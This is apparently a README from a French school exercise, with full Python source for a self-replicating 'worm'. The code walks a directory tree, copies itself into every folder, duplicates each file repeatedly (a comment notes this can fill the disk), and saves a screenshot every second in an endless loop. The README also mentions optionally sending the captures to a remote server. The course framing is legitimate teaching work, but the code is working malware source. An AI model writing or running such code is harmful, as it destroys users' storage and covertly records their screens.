# Vers-Python-IPSSI
<!-- Image centrée -->

<div align="center">

![CAPTURE](https://zupimages.net/up/22/48/cf4u.png)

</div>

<!-- --------------------------- -->

**Vers-Python-IPSSI** a été réalisé dans le cadre pédagogique de l'IPSSI avec un projet sur 1,5 jours. 

>Un ver informatique est un logiciel malveillant qui se reproduit sur plusieurs ordinateurs en utilisant un réseau informatique comme Internet

# Prérequis
- Visual studio code

- Python3

- Connaissances basique / intermédiaire en Python

Il est recommandé d'exécuter ce programme dans un environnement virtuel, il est possible d'en mettre un en place à l'aide des logiciels suivants : 
- Virtualbox --> Sur une VM Windows / Linux
- VMWare workstation pro --> Sur une VM Windows / Linux
- ...

# Description du projet

### Dépendances

Le projet nécessite l'installation de dépendances Python, ces dernières sont disponibles dans le fichier ```requirements.txt```.

```
pip install -r requirements.txt
```

>Il sera également nécessaire de relancer l'interpréteur de code afin de prendre en compte l'installation.

### Architecture du projet 

Le projet repose sur 1 fichiers Python : 

- ```vers.pyw``` --> Qui contient le code du vers (exécutable avec un double clic comme un .EXE, pour tester)

### Fonctionnement du projet

Le projet déroule en plusieurs étapes :

1) Exécution du code par la victime

2) Le vers va alors **analyser le système** (répertoires / sous répertoires données )

3) Le vers **va alors se répliquer dans les répertoires cibles** de la victime

4) Le vers va prendre des screenshots chaques secondes et les stocker dans C:\Screenshots 


### Mise en réseau
Ce projet se déroule entièrement en **local**.

# Axes d'améliorations du code
Après la phase de réalisation du projet, le professeur nous a demandé une personnalisation du code afin d'améliorer ce dernier.

Pour ce projet, les améliorations suivantes ont été mises en place :

- [x] Chaque seconde, le vers va prendre des captures d'écran et les stocker dans C:\Screenshots ( pour besoins des tests, il est possible d'envoyer les screenshots sur un serveur distant)
- [x] &&&
- [x] &&&

# Mise en place de l'environement de travail

Il est conseillé, pour travailler dans de bonnes conditions, d’ouvrir un **répertoire de travail** ( sur le bureau ou autre ) sur Visual Studio Code

Une fois le répertoire créé, dans visual studio code il faut cliquer sur ```Fichier``` → ```Ouvrir le dossier```

Une fois cette étape réalisée il suffit d'importer les fichiers .py dans le répertoire de travail et l'exécution est désormait possible

# Explications sur le code

## Fonctions

Les fonctions sont toutes dans une classe, appelée ```Vers```, les fonctions en son sein permettent :
- Fonction ```__init__``` = d'initialiser le vers
  - De définir où commencer la recherche de répertoires (la valeur par défaut est définie sur le répertoire racine)
  - De donner la possibilité de transmettre une liste de répertoires cibles initiaux. Par défaut c'est une liste vide []
  - De définir le nombre d'instances que le ver créera pour chaque fichier existant dans un répertoire

- Fonction ```lister_repertoires``` = d'analyser le système
  - Cette partie va nous permettre d’accéder au contenu des répertoires spécifiés précédemment. C’est-à-dire tous les répertoires et sous-répertoires y contenu. 

- Fonction ```creation_vers``` = Permet de répliquer le ver dans les répertoires cibles.

- Fonction ```copier_fichiers_existants``` = Permet de dupliquer les fichiers le nombre de fois la valeur que nous avons de l'argument itération.

- Fonction ```create_directory``` = Permet de créer un répertoire dans le disque C:\ ( nécessite les droits d'admin )

- Fonction ```screenshots``` = Permet de prendre une capture d'écran toutes les secondes ( le time.sleep(1) permet de définir le nombre de secondes d'intervalles )

- Fonction ```start_vers``` = Permet d'appeler toutes les fonctions créées précédemment

```python
class Vers:
        #Initialisation 
        def __init__(classVers, path=None, repertoire_cible=None, replication=None):
            # Définit où commencer la recherche de répertoires (la valeur par défaut est définie sur le répertoire racine)
            if isinstance(path, type(None)):
                classVers.path="/"
            else:
                classVers.path = path
            # Possibilitée de transmettre une liste de répertoires cibles initiaux. Par défaut c'est une liste vide []
            if isinstance(repertoire_cible, type(None)):
                classVers.repertoire_cible=[]
            else:
                classVers.repertoire_cible = repertoire_cible
            # Définit le nombre d'instances que le ver créera pour chaque fichier existant dans un répertoire
            if isinstance(repertoire_cible, type(None)):
                classVers.replication = 10
            else:
                classVers.replication = replication

            # Prendre le chemin absolu
            classVers.own_path = os.path.realpath(__file__)
        # Cette fonction va nous permettre d’accéder au contenu des répertoires spécifiés précédemment. C’est-à-dire tous les répertoires et sous-répertoires y contenu. 
        def lister_repertoires(classVers, path):
            classVers.repertoire_cible.append(path)
            fichier_dans_le_repertoire = os.listdir(path)

            for file in fichier_dans_le_repertoire:
                # Évite les répertoires / fichiers cachés
                if not file.startswith('.'):
                    # Prends le PATH complet
                    path_absolu = os.path.join(path, file)
                    print(path_absolu)

                    if os.path.isdir(path_absolu):
                        classVers.lister_repertoires(path_absolu)
                    else:
                        pass
        #Fonction de création du vers
        # Permet de répliquer le ver dans les répertoires cibles.
        def creation_vers(classVers):
            for directory in classVers.repertoire_cible:
                destination = os.path.join(directory, "vers.py")
                # Copie le script dans le nouveau répertoire avec un noms similaires
                shutil.copyfile(classVers.own_path, destination)

        def copier_fichiers_existants(classVers):
            # La méthode suivante sera utilisée pour dupliquer les fichiers le nombre de fois la valeur que nous avons de l'argument itération. 
            # Il est possible de mettre un grand nombre pour que le disque dur soit plein.
            for directory in classVers.repertoire_cible:
                file_list_in_dir = os.listdir(directory)
                for file in file_list_in_dir:
                    abs_path = os.path.join(directory, file)
                    if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                        source = abs_path
                        for i in range(classVers.replication):
                            destination = os.path.join(directory,(file+str(i)))
                            shutil.copyfile(source, destination)
        #Créer un répertoire "Screenshot" dans C:\
        def create_directory(classVers):
            repertoire_parent = "C:\\"
            repertoire_a_creer = "Screenshots"
            classVers.fullpath_directory = os.path.join(repertoire_parent, repertoire_a_creer)
            if not os.path.exists(classVers.fullpath_directory):
                os.mkdir(classVers.fullpath_directory)
        #Captures saves dans le répertoire "Screenshot" dans C:\, incrémentées par 1
        def screenshots(classVers):
            i=0
            while True:
                screenshot = ImageGrab.grab()
                filename = (os.path.join(classVers.fullpath_directory, "Screenshot"+str(i+1)+".png"))
                screenshot.save(filename) 
                time.sleep(1)
                i=i+1
        #Fonction de lancement de toutes les fonctions du vers
        def start_vers(classVers):
            classVers.lister_repertoires(classVers.path)
            classVers.creation_vers()
            classVers.copier_fichiers_existants()
            classVers.create_directory()
            classVers.screenshots()

 ```

## Traitement

Cette partie permet de définir le PATH à attaquer et d'appeler la fonction qui lance toutes les fonctions sur le PATH donné.

```python
if __name__=="__main__":
    attack_directory = os.path.abspath(r"C:\Users\ADM_VM01\Desktop\TEST FOLDER")
    VersFinal = Vers(path=attack_directory)
    VersFinal.start_vers()
 ```
